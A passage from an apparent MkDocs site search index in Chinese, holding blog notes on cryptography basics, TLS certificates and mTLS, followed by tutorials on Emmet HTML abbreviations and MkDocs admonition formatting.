<li>\u6709\u4e24\u4e2a\u5f88\u5927\u7684\u8d28\u6570\u00a0\ud835\udc5dp\u00a0\u548c\u00a0\ud835\udc5eq\uff0c\u8ba1\u7b97\u00a0\ud835\udc5d\ud835\udc5epq\u00a0\u662f\u975e\u5e38\u5bb9\u6613\u7684</li> <li>\u4f46\u7ed9\u5b9a\u00a0\ud835\udc5d\ud835\udc5epq\uff0c\u8981\u5206\u89e3\u51fa\u00a0\ud835\udc5dp\u00a0\u548c\u00a0\ud835\udc5eq\u00a0\u662f\u56f0\u96be\u7684</li> </ul> </li> <li>ECC\u00a0\u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u5b66<ul> <li>\u57fa\u4e8e\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u95ee\u9898\uff08ECDLP\uff09\uff0c\u7c7b\u4f3c\u00a0Diffie-Hellman\u00a0\u5bc6\u94a5\u4ea4\u6362</li> <li>\ud835\udc54g\u00a0\u662f\u692d\u5706\u66f2\u7ebf\u4e0a\u7684\u4e00\u4e2a\u516c\u5f00\u70b9\uff0c\ud835\udc4ea\u00a0\u662f\u79d8\u5bc6\u503c\uff0c\u8ba1\u7b97\u00a0\ud835\udc4e\u22c5\ud835\udc54a\u22c5g\u00a0\u662f\u5bb9\u6613\u7684</li> <li>\u4f46\u7ed9\u5b9a\u00a0g\u00a0\u548c\u00a0a\u22c5g\uff0c\u8981\u627e\u5230\u00a0\ud835\udc4ea\u00a0\u662f\u56f0\u96be\u7684</li> <li>\u76f8\u6bd4\u00a0RSA\uff0cECC\u00a0\u80fd\u591f\u5728\u66f4\u77ed\u7684\u5bc6\u94a5\u957f\u5ea6\u4e0b\u63d0\u4f9b\u76f8\u540c\u7684\u5b89\u5168\u6027</li> </ul> </li> <li>\u540e\u91cf\u5b50\u5bc6\u7801\u5b66\uff1a\u57fa\u4e8e\u683c\u3001\u54c8\u5e0c\u51fd\u6570\u3001\u4ee3\u7801\u7b49\u6784\u5efa\u7684\u5bc6\u7801\u5b66<ul> <li>https://eprint.iacr.org/2024/555</li> <li>AES\u00a0\u7b49\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u4e0d\u53d7\u91cf\u5b50\u8ba1\u7b97\u673a\u7684\u5f71\u54cd</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_10","title":"\u4e2d\u95f4\u4eba\u653b\u51fb","text":"<ul> <li>Diffie-Hellman\u00a0\u5bc6\u94a5\u4ea4\u6362\u4ecd\u7136\u4e0d\u80fd\u89e3\u51b3\u4e2d\u95f4\u4eba\u653b\u51fb</li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#tls-ca","title":"TLS\u00a0\u8bc1\u4e66\u4e0e\u00a0CA","text":"<ul> <li>\u8bc1\u4e66\uff1a\u6570\u5b57\u7b7e\u540d\u7684\u516c\u94a5<ul> <li>\u7531\u4e00\u4e2a\u53cc\u65b9\u90fd\u76f8\u4fe1\u7684\u7b2c\u4e09\u8005\u00a0Charlie\u00a0\u7b7e\u53d1\uff0cCharlie\u00a0\u5c31\u662f\u00a0CA</li> <li>Charlie\u00a0\u901a\u8fc7\u5176\u4ed6\u5b89\u5168\u624b\u6bb5\u9a8c\u8bc1\u00a0Bob\u00a0\u7684\u8eab\u4efd\uff0c\u7b7e\u53d1\u00a0Bob\u00a0\u7684\u8bc1\u4e66<ul> <li>\u76f8\u5f53\u4e8e\u00a0Charlie\u00a0\u4e3a\u00a0Bob\u00a0\u7684\u8eab\u4efd\u80cc\u4e66</li> </ul> </li> <li>Bob\u00a0\u5728\u4ea4\u6362\u5bc6\u94a5\u7684\u540c\u65f6\u53d1\u9001\u81ea\u5df1\u7684\u8bc1\u4e66\uff0c\u4ee5\u8bc1\u660e\u81ea\u5df1\u662f\u771f\u7684\u00a0Bob</li> <li>\u5982\u679c\u00a0Alice\u00a0\u4fe1\u4efb\u00a0Charlie\uff0c\u90a3\u4e48\u5979\u4e5f\u4f1a\u4fe1\u4efb\u00a0Bob\u00a0\u7684\u8bc1\u4e66\u8fdb\u800c\u4fe1\u4efb\u00a0Bob</li> <li>Eve\u00a0\u65e0\u6cd5\u4f2a\u9020\u00a0Bob\u00a0\u7684\u8bc1\u4e66\uff0c\u56e0\u4e3a\u5979\u65e0\u6cd5\u5411\u00a0Charlie\u00a0\u8bc1\u660e\u81ea\u5df1\u662f\u00a0Bob</li> </ul> </li> <li>\u5982\u4f55\u786e\u4fdd\u00a0CA\u00a0\u662f\u53ef\u4fe1\u7684\uff1f<ul> <li>\u7531\u64cd\u4f5c\u7cfb\u7edf\u6216\u6d4f\u89c8\u5668\u5185\u7f6e\u7684\u00a0CA\u00a0\u5217\u8868\uff1a\u6839\u8bc1\u4e66\uff0c\u7ea6\u00a0150\u00a0\u4e2a</li> <li>\u6839\u8bc1\u4e66\u662f\u81ea\u7b7e\u540d\u7684\u4e14\u88ab\u4fe1\u4efb\uff0c\u5176\u7b7e\u53d1\u4e00\u7cfb\u5217\u4e2d\u95f4\u8bc1\u4e66\uff0c\u4e2d\u95f4\u8bc1\u4e66\u7b7e\u53d1\u7ec8\u7aef\u8bc1\u4e66</li> <li>\u4e0d\u5b88\u89c4\u77e9\u7684\u00a0CA\u00a0\u4f1a\u88ab\u540a\u9500\u8bc1\u4e66\uff0c\u4e0d\u518d\u88ab\u4fe1\u4efb\uff08WoSign\u00a0\u8fdd\u89c4\u4e8b\u4ef6\uff0c2016\uff09</li> <li>\u8bc1\u4e66\u900f\u660e\u5ea6\uff1a\u516c\u5f00\u00a0CA\u00a0\u7b7e\u53d1\u7684\u8bc1\u4e66\uff0c\u9632\u6b62\u00a0CA\u00a0\u6076\u610f\u7b7e\u53d1\u8bc1\u4e66</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#mtls","title":"mTLS","text":"<ul> <li>\u4e00\u822c\u6765\u8bf4\uff0c\u670d\u52a1\u5668\u9700\u8981\u5411\u5ba2\u6237\u7aef\u8bc1\u660e\u81ea\u5df1</li> <li>\u5728\u6709\u4e9b\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u4e5f\u9700\u8981\u5411\u670d\u52a1\u5668\u8bc1\u660e\u81ea\u5df1<ul> <li>\u4f8b\u5982\u670d\u52a1\u5668\u9700\u8981\u9a8c\u8bc1\u5ba2\u6237\u7aef\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u67d0\u4e9b\u8d44\u6e90</li> </ul> </li> <li>mTLS\uff1aMutual TLS<ul> <li>\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u90fd\u9700\u8981\u5411\u5bf9\u65b9\u63d0\u4f9b\u8bc1\u4e66</li> <li>\u76f8\u4e92\u9a8c\u8bc1\u5bf9\u65b9\u7684\u8bc1\u4e66</li> <li>\u76f8\u6bd4\u4e8e\u4f20\u7edf\u7684\u5e10\u5bc6\u9a8c\u8bc1\uff0cmTLS\u00a0\u66f4\u52a0\u5b89\u5168\uff0c\u4f46\u8bbe\u7f6e\u4e5f\u66f4\u590d\u6742</li> </ul> </li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/4_base-of-web/#_11","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u300c\u5b9e\u7528\u6280\u80fd\u62fe\u9057\u300d\u7f51\u7edc/\u7f51\u7ad9\u57fa\u7840\u77e5\u8bc6\u6982\u8ff0</li> <li>Web\u673a\u5236</li> <li>\u4e92\u8054\u7f51\u662f\u5982\u4f55\u5de5\u4f5c\u7684</li> </ul>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/5_Emmet/","title":"5 Emmet","text":"<p>\u5f88\u591a\u4eba\u60f3\u8981\u642d\u5efa\u81ea\u5df1\u7684\u4e00\u4e2a\u7f51\u7ad9\uff0c\u54ea\u6015\u53ea\u662f\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u3001\u53ea\u6709\u4e00\u4e2a\u4e3b\u8981\u6587\u4ef6\u7684\u9875\u9762\u3002</p> <p>\u9996\u5148\u53ef\u4ee5\u770b\u770b Web \u5165\u95e8\u3002\u4f46\u662f\u7eaf\u624b\u52a8\u5199\u4e00\u6574\u4e2a\u7f51\u9875\u4f1a\u7d2f\u6b7b\u7684\uff0c\u90a3\u4e48\u591a <code>&lt; / &gt;</code> \u90fd\u591f\u559d\u4e00\u58f6\u7684\u4e86\uff0c\u4e8e\u662f\u6709\u4e86 Emmet \u8bed\u6cd5\u3002\u7b80\u800c\u8a00\u4e4b\uff0cEmmet \u662f html \u7b49\u8bed\u6cd5\u7684\u7f29\u5199\u683c\u5f0f\uff0c\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u6211\u4eec\u5199\u7b80\u5355\u524d\u7aef html \u7684\u901f\u5ea6\u3002</p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#_1","title":"\u4ecb\u7ecd","text":"<p>\u5bf9\u4e8e VScode \u7528\u6237\uff0c\"Support for\u00a0Emmet\u00a0snippets and expansion is built right into Visual Studio Code,\u00a0no extension required.\" \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u5f00\u76d2\u5373\u7528\uff0c\u81f3\u591a\u4e5f\u5c31\u9700\u8981\u5982\u4e0b\u8bbe\u7f6e</p> <p>\u5982\u679c\u8981\u4f7f\u7528 Tab \u952e\u5c55\u5f00 Emmet \u7f29\u5199\uff0c\u8bf7\u5728 <code>settings.json</code> \u6dfb\u52a0\u4ee5\u4e0b\u8bbe\u7f6e\uff1a</p> <pre><code>\"emmet.triggerExpansionOnTab\": true\n</code></pre> <p>\u6b64\u8bbe\u7f6e\u5141\u8bb8\u5728\u6587\u672c\u4e0d\u662f Emmet \u7f29\u5199\u65f6\u4f7f\u7528 Tab \u952e\u8fdb\u884c\u7f29\u8fdb\u3002</p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#_2","title":"\u4f7f\u7528","text":"<p>\u6211\u4eec\u5148\u4e3b\u8981\u4ecb\u7ecd\u5728 html \u4e2d\u7684\u4f7f\u7528\uff1b\u8bf7\u6ce8\u610f\uff0c\u9700\u8981\u624b\u52a8\u8f93\u5165\uff0c\u5e76\u4e14\u9700\u8981\u5728 html \u6587\u4ef6\u4e2d\uff0c\u76f4\u63a5\u590d\u5236\u7c98\u8d34\u6216\u8005\u662f\u5176\u4ed6\u6587\u4ef6\u79cd\u7c7b\u4e2d\u4e0d\u80fd\u89e6\u53d1 emmet\uff0c\u89e6\u53d1\u540e <code>Tab</code> \u952e\u5373\u53ef\u5c06\u5f53\u524d\u9009\u4e2d\u8f93\u5165\u3002</p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#_3","title":"\u7b26\u53f7","text":"","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#_4","title":"<code>!</code>","text":"<p>\u53ea\u9700\u4e00\u4e2a <code>!</code> \u800c\u540e <code>Tab</code> \u5373\u53ef\u6784\u5efa\u4e00\u4e2a\u5927\u81f4\u7684\u6846\u67b6\uff01</p> <p></p> <p>\u4e0b\u9762\u662f\u8fdb\u9636\u7528\u6cd5\uff0c\u76f8\u4fe1\u5982\u679c\u5b66\u4e60\u8fc7 Tree \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u4e0d\u96be\u7406\u89e3\u3002</p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#multiplication","title":"Multiplication: <code>*</code>","text":"<p>\u91cd\u590d\u6027\u6807\u7b7e\uff08\u70b9\u540d <code>&lt;li&gt;&lt;/li&gt;</code>\uff09\u592a\u591a\u4e86\uff1f\u4f7f\u7528\u4e58\u53f7 <code>*</code> \u662f\u5f88\u7b26\u5408\u6211\u4eec\u8ba4\u77e5\u7684\uff0c\u5c06\u5728\u4e0b\u9762\u4e00\u8d77\u6f14\u793a\u3002</p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#child","title":"child: <code>&gt;</code>","text":"<p>\u6211\u4eec\u4f7f\u7528 <code>&gt;</code> \u6765\u8868\u793a\u6807\u7b7e\u4e4b\u95f4\u7684\u4ece\u5c5e\u5173\u7cfb\uff0c\u4f8b\u5982\uff1a</p> <pre><code>nav&gt;ul&gt;li*5\n</code></pre> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#item-numbering","title":"Item numbering: <code>$</code>","text":"<p>\u53ef\u4ee5\u53d1\u73b0 <code>*</code> \u53ea\u80fd\u91cd\u590d\uff0c\u90a3\u6211\u60f3\u6765\u4e2a item 1\u3001item 2 \u7b49\u7b49\u548b\u529e\uff1f\u7528 <code>$</code></p> <ul> <li><code>$</code> \u7528\u4e8e\u7f16\u53f7\uff0c\u591a\u4e2a\u53ef\u8868\u793a\u591a\u4f4d\u6570\uff0c\u81ea\u52a8\u8865 0</li> <li><code>@</code> </li> </ul> <pre><code>ul&gt;li.item$@3*5\n</code></pre>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#sibling","title":"Sibling: <code>+</code>","text":"<pre><code>div+p+bq\n</code></pre>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#climb-up","title":"Climb-up: <code>^</code>","text":"<p>\u5f53\u5d4c\u5957\u4f7f\u7528\u7684\u65f6\u5019\u4f1a\u6709\u6240\u6df7\u6dc6\u3002</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u60f3\u8981\u8ba9 p \u548c bp \u662f sibling \u800c span \u548c em \u662f p \u7684 children </p> <p>\u96be\u9053\u6211\u4eec\u8fd9\u6837\u5199\u5417:</p> <pre><code>bq+q&gt;span+em\n</code></pre> <p></p> <p>\u90a3\u6211\u60f3\u8981 q \u5728 bq \u524d\u9762\uff08\u591a\u4e8b\u7684\u7532\u65b9\uff09\u600e\u4e48\u529e\uff1f</p> <p>\u4e8e\u662fEmmet \u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u66f4\u52a0\u65b9\u4fbf\u7684\u505a\u6cd5\uff0c\u5373\u4f7f\u7528 <code>^</code> \u6765\u201c\u5411\u4e0a\u722c\u201d\uff01</p> <pre><code>div+div&gt;p&gt;span+em^bq\n</code></pre> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#grouping","title":"Grouping: <code>()</code>","text":"<p>\u5f53\u7136\uff0c\u4f7f\u7528\u62ec\u53f7\u8868\u793a\u201c\u4e00\u5bb6\u5b50\u4eba\u201d \u662f\u66f4\u52a0\u6bd4\u8f83\u7b26\u5408\u6211\u4eec\u8ba4\u77e5\u7684\u884c\u4e3a</p> <pre><code>div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p\n</code></pre> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#text","title":"Text: <code>{}</code>","text":"<p>\u5728\u4e0a\u9762\u6211\u4eec\u4f7f\u7528\u4e86 <code>&lt;a&gt;</code> \u8fd9\u4e2a\u6807\u7b7e\uff0c\u6211\u4eec\u77e5\u9053\u4e00\u822c\u9700\u8981\u5728\u4e2d\u95f4\u6dfb\u52a0\u663e\u793a\u7684\u6587\u672c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 <code>{}</code> \u5305\u88f9\u6587\u672c\u81ea\u52a8\u586b\u5165\u5176\u4e2d\uff0c\u5f53\u7136 <code>&lt;p&gt;</code> \u8fd9\u7c7b\u6807\u7b7e\u90fd\u80fd\u4f7f\u7528</p> <pre><code>p&gt;{Click }+a{here}+{ to continue}\n</code></pre> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#id-and-class-attributes","title":"ID and CLASS attributes <code># .</code>","text":"<p>\u6211\u4eec\u4e60\u60ef\u4e8e\u4f7f\u7528 <code>#</code> \u6765\u8868\u793a\u6807\u9898\u7b49\uff08\u5982 markdown\uff09\u4f7f\u7528 <code>.</code> \u6765\u8868\u793a\u7c7b\u6210\u5458\uff08\u5982 c++\uff09</p> <p>Emmet \u5f15\u5165\u4e86\u8fd9\u4e9b\u7528\u6cd5\uff1a</p> <pre><code>form#search.wide.other_class\n</code></pre> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#custom-attributes","title":"Custom attributes <code>[]</code>","text":"<p>\u5bf9\u4e8e\u5176\u5b83\u7684\u4e00\u4e9b\u5c5e\u6027\uff0c\u53ef\u4ee5\u7528 <code>[]</code> \u5305\u88f9\u5b9e\u73b0</p> <pre><code>td[rowspan=2 colspan=3 title]\n</code></pre> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#implicit-tag-names","title":"Implicit tag names","text":"<p>\u6700\u4e3a\u5389\u5bb3\u7684\u662f\uff0c\u7531\u4e8e\u5f88\u591a\u65f6\u5019\u6211\u4eec\u6807\u7b7e\u5d4c\u5957\u6216\u8005\u662f\u67d0\u4e9b\u7c7b\u4e3b\u8981\u51fa\u73b0\u5728\u7279\u5b9a\u6807\u7b7e\u5185\uff0c\u6240\u4ee5\uff1a</p> <p></p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#lorem-ipsum","title":"Lorem Ipsum","text":"<p>\u5728\u524d\u7aef\u6d4b\u8bd5\u65f6\u5e38\u5e38\u4f1a\u4f7f\u7528 Lorem Ipsum \u4f5c\u4e3a\u6587\u672c\uff0c\u5b83\u4eec\u540c\u6837\u53ef\u4ee5\u653e\u5165 Emmet \u4e2d\u4f7f\u7528</p> <pre><code>p*4&gt;lorem\n</code></pre> <pre><code>\u00a0 \u00a0 &lt;p&gt;Lorem ipsum dolor sit amet consectetur, adipisicing elit. Dolorum nobis natus nulla, quam quia eum atque neque rem sapiente facilis, eaque eos laudantium distinctio a est qui. Veritatis, pariatur! Aperiam.&lt;/p&gt;\n\u00a0 \u00a0 &lt;p&gt;Quod voluptatibus nam quidem perferendis obcaecati enim culpa laborum modi voluptatum? Incidunt, aliquid, quod nostrum dolorem ipsam libero eum ab, corrupti nisi sint excepturi ipsum veniam quisquam officiis. Magnam, dolor!&lt;/p&gt;\n\u00a0 \u00a0 &lt;p&gt;Inventore, iste ea nemo molestias quisquam velit, facilis itaque repellat eos esse, sapiente ab. Blanditiis earum, aliquam corrupti quasi eum dolorem ipsa delectus ratione. Quasi consequatur ipsam corporis. Exercitationem, commodi.&lt;/p&gt;\n\u00a0 \u00a0 &lt;p&gt;Quas voluptatem mollitia omnis corporis tempora adipisci suscipit maxime molestias in amet, ipsam consequuntur qui natus, earum nulla delectus, accusantium nisi ut odit explicabo alias commodi exercitationem? Iste, explicabo officia?&lt;/p&gt;\n</code></pre>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#_5","title":"\u7f29\u5199","text":"<p>\u90a3\u770b\u4e86\u8fd9\u4e48\u591a\uff0c\u53d1\u73b0\u6709\u4e9b\u60c5\u51b5\u4e0b\u4f7f\u7528\u4e86\u7f29\u5199\uff08\u5982\u7528 bq \u8868\u793a\u4e86 blockquote\uff09\u8fd8\u6709\u54ea\u4e9b\u7f29\u5199\uff1f\u5728</p> <p>Emmet document \u4e2d\u8fdb\u884c\u4e86\u8be6\u7ec6\u8bb2\u89e3\uff0c\u89c1\u53c2\u8003\u6587\u6863\u3002</p> <p>\u4e2a\u4eba\u8ba4\u4e3a\u65e0\u9700\u8bb0\u5fc6\uff0c\u9700\u8981\u65f6\u518d\u641c\u7d22\uff0c\u6216\u8005\u7b49\u67d0\u4e9b\u7528\u6cd5\u7528\u5f97\u591a\u4e86\u8fd8\u8bb0\u4e0d\u4f4f\u518d\u505a\u6458\u6284\u3002</p>","tags":["blog","web","note"]},{"location":"tutorial/MIT/5_Emmet/#_6","title":"\u53c2\u8003\u6587\u6863","text":"<ul> <li>Emmet in Visual Studio Code</li> <li>Emmet document</li> <li>\u9009\u770b\uff1aWeb\u00a0\u8bcd\u6c47\u8868</li> </ul>","tags":["blog","web","note"]},{"location":"tutorial/begin/","title":"Begin","text":"<p>\u5982\u679c\u521a\u63a5\u89e6\u4e0b\u9762\u7684\u4e1c\u897f\uff0c\u4e0d\u59a8\u770b\u770b\u5427\uff01</p> begin          <ul> <li> chrome_begin  455  2 mins              1740043260 </li> <li> logisim_begin  1027  3  3 mins              1740043260 </li> <li> Mkdocs_begin  1494  164  7 mins              1740043260 </li> <li> Obsidian_begin  4736  79  17 mins              1740043260 </li> <li> Python_begin  1446  1  5 mins              1740043260 </li> <li> Typst_begin  1156  18  4 mins              1740043260 </li> <li> Url_begin  1069  7  4 mins              1740043260 </li> <li> Utools_begin  735  2 mins              1740043260 </li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/","title":"Mkdocs begin","text":"Summary <p>Mkdocs \u662f\u4e00\u6b3e\u535a\u5ba2\u7b14\u8bb0\u5de5\u5177\uff0c\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u4f7f\u7528 Mkdocs \u4e2d\u7684\u9ad8\u7ea7\u683c\u5f0f\uff0c\u5305\u62ec\uff1a</p> <ul> <li>Admonitions\uff1a\u7528\u4e8e\u6dfb\u52a0\u5927\u6bb5\u8d44\u6599\u6279\u6ce8\uff0c\u652f\u6301\u6ce8\u91ca\u5757\u3001\u53ef\u6298\u53e0\u6ce8\u91ca\u5757\u3001\u5185\u8054\u5757\u7b49\u7c7b\u578b\u3002</li> <li>Annotations\uff1a\u7528\u4e8e\u5728\u6587\u672c\u4e2d\u6dfb\u52a0\u65c1\u6ce8\uff0c\u53ef\u4ee5\u5e94\u7528\u4e8e\u6807\u9898\u3001\u8868\u683c\u7b49\u591a\u79cd\u5143\u7d20\u3002</li> <li>Buttons\uff1a\u7528\u4e8e\u521b\u5efa\u6309\u94ae\uff0c\u652f\u6301\u586b\u5145\u548c\u81ea\u5b9a\u4e49\u6837\u5f0f\u3002</li> <li>Code blocks\uff1a\u7528\u4e8e\u5c55\u793a\u4ee3\u7801\uff0c\u652f\u6301\u9ad8\u4eae\u3001\u884c\u53f7\u3001\u6ce8\u91ca\u7b49\u529f\u80fd\u3002</li> <li>Content tabs\uff1a\u7528\u4e8e\u521b\u5efa\u5185\u5bb9\u9009\u9879\u5361\uff0c\u53ef\u4ee5\u5207\u6362\u663e\u793a\u4e0d\u540c\u5185\u5bb9\u3002</li> <li>Data tables\uff1a\u7528\u4e8e\u521b\u5efa\u6570\u636e\u8868\u683c\uff0c\u652f\u6301\u5bf9\u9f50\u3001\u8fb9\u6846\u7b49\u6837\u5f0f\u3002</li> <li>Diagrams\uff1a\u7528\u4e8e\u521b\u5efa\u6d41\u7a0b\u56fe\u7b49\u56fe\u8868\uff0c\u652f\u6301 mermaid \u8bed\u6cd5\u3002</li> <li>Footnotes\uff1a\u7528\u4e8e\u6dfb\u52a0\u811a\u6ce8\uff0c\u652f\u6301\u8d85\u94fe\u63a5\u7d22\u5f15\u3002</li> <li>Grids\uff1a\u7528\u4e8e\u521b\u5efa\u7f51\u683c\u5e03\u5c40\uff0c\u53ef\u4ee5\u5c55\u793a\u5217\u8868\u3001\u9009\u9879\u5361\u7b49\u5185\u5bb9\u3002</li> <li>Icons, Emojis\uff1a\u7528\u4e8e\u6dfb\u52a0\u8868\u60c5\u7b26\u53f7\u548c\u56fe\u6807\uff0c\u652f\u6301 twemoji \u8868\u60c5\u96c6\u3002</li> </ul> <p>\u5728\u4f7f\u7528 Mkdocs \u4f5c\u535a\u5ba2\u7b14\u8bb0\u65f6\uff0c\u53d1\u73b0\u5176\u4ed6\u4eba\u7684\u6587\u7ae0\u6709\u4e00\u4e9b\u6bd4\u8f83\u6709\u610f\u601d\u7684\u683c\u5f0f\uff0c\u7f8e\u89c2\u65b9\u4fbf\uff0c\u6545\u5b66\u4e60\u53c2\u8003\uff0c\u6b64\u5904\u4e3b\u8981\u8bb0\u5f55\u7528\u6cd5\u5907\u5fd8\uff0c\u5177\u4f53\u914d\u7f6e\u8bf7\u8f6c\u79fb\u81f3\u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u67e5\u770b\uff0c\u6211\u53ea\u4f1a\u7ed9\u51fa\u57fa\u672c\u7684\u914d\u7f6e\u6559\u7a0b\uff1b\u5927\u591a\u6570\u683c\u5f0f\u90fd\u662f\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528\u7684\uff0c\u6587\u4e2d\u4e0d\u4f1a\u8fc7\u591a\u63d0\u53ca\uff0c\u8bf7\u81ea\u884c\u63a2\u7d22\u3002</p> <ul> <li>\u8fd9\u91cc\u662f\u4e00\u4efd\u8be6\u5c3d\u7684\u964d\u538b\u5b9d\u5178 \uff0c\u65e8\u5728\u5b8c\u5584\u7ec6\u8282\u4ee5\u4fbf\u5448\u73b0\u66f4\u597d\u5730\u6548\u679c\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u770b\u770b\u3002</li> <li>\u8fd9\u91cc\u662f\u6bd4\u8f83\u7279\u522b\u7684 MKDocs \u63d2\u4ef6\u5217\u8868</li> </ul>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#admonitions","title":"Admonitions","text":"<p>\u4e3b\u8981\u7528\u4e8e\u6dfb\u52a0\u5927\u6bb5\u8d44\u6599\u6279\u6ce8</p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#madocsyml","title":"madocs.yml \u914d\u7f6e","text":"mkdocs.yml \u914d\u7f6e <pre><code>theme:\n  icon:\n    admonition:\n      note: octicons/tag-16\n      abstract: octicons/checklist-16\n      info: octicons/info-16\n      tip: octicons/squirrel-16\n      success: octicons/check-16\n      question: octicons/question-16\n      warning: octicons/alert-16\n      failure: octicons/x-circle-16\n      danger: octicons/zap-16\n      bug: octicons/bug-16\n      example: octicons/beaker-16\n      quote: octicons/quote-16\n</code></pre>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_1","title":"\u7528\u6cd5","text":"","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_2","title":"\u6ce8\u91ca\u5757","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 !!! + \u7c7b\u578b + \"\u6807\u9898\" \u6807\u660e\u544a\u8beb\u5757\uff0c\u5728\u5176\u4e0b\u4f7f\u7528\u7f29\u8fdb\u8868\u660e\u5176\u5185\u5bb9\u6240\u5728</p> <p>\u53ef\u4ee5\u4f7f\u7528\u7a7a\u8868\u793a\u4e0d\u9700\u8981\u6807\u9898</p> <p>\u4f8b\u5982</p> <pre><code>!!! note \"\u8fd9\u662f\u4e00\u4e2a\u6ce8\u91ca\u5757\"\n    \u8fd9\u91cc\u662f\u5185\u5bb9\n</code></pre> <p>\u90a3\u4e48\u5448\u73b0\u6548\u679c\u5982\u4e0b\uff1a</p> <p>\u8fd9\u662f\u4e00\u4e2a\u6ce8\u91ca\u5757</p> <p>\u8fd9\u91cc\u662f\u5185\u5bb9</p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_3","title":"\u53ef\u6298\u53e0\u6ce8\u91ca\u5757","text":"<p>\u5c06\u4e09\u4e2a ! \u6362\u4e3a\u4e09\u4e2a ? \u5373\u53ef\uff0c\u5982\u679c\u60f3\u8981\u5448\u73b0\u5c55\u5f00\u7684\u72b6\u6001\uff0c\u518d\u52a0\u4e00\u4e2a + \u53f7\u5373\u53ef</p> \u8fd9\u662f\u53ef\u6298\u53e0\u6ce8\u91ca\u5757 <p>\u8fd9\u91cc\u662ftips</p>","tags":["begin"]},{"location":"tutorial/begin/Mkdocs_begin/#_4","title":"\u5185\u8054\u5757","text":"<p>\u5728\u7c7b\u578b\u540e\u52a0\u4e0a inline \u53ef\u6784\u6210\u5185\u8054\u5757\u653e\u5728\u5de6\u4fa7\uff0c\u518d\u52a0\u4e0a end \u53ef\u653e\u5728\u53f3\u4fa7\uff08\u4e2a\u4eba\u504f\u7231\uff09</p> <pre><code>!!! info inline end \"Lorem ipsum\"\n    Lorem ipsum dolor sit amet, consectetur\n    adipiscing elit. Nulla et euismod nulla.\n    Curabitur feugiat, tortor non consequat\n    finibus, justo purus auctor massa, nec\n    semper lorem quam in massa.\n</code></pre> <p>\u6548\u679c\u5982\u4e0b</p> <p>\u8fd9\u662f\u5185\u8054\u5757</p> <p>\u8fd9\u91cc\u662f\u6587\u672c</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p> <p>\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c\u8fd9\u91cc\u662f\u6587\u672c</p> 